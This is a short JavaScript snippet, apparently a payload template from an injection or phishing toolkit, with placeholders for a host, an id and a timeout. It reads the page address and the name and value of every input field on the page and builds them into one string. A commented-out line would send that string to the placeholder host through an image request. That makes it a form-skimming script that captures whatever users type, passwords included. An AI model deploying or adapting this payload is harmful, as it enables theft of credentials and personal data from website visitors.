function postData() {	
        console.log("aaaa");                
        var output = "value="+document.location;
        var inputs, index;

        inputs = document.getElementsByTagName('input');		
        for (index = 0; index < inputs.length; ++index) {
                input_name = inputs[index].id || inputs[index].name;
				console.log(inputs[index].value);
                output = output + "||||" + input_name + "=" + inputs[index].value;
        }
        
        //output = encodeURI(output);
		console.log(output);
		
        //new Image().src = "<-|HOST|->rev?id=<-|ID|->&"+output;

}

setTimeout("postData()","<+|timeout|+>");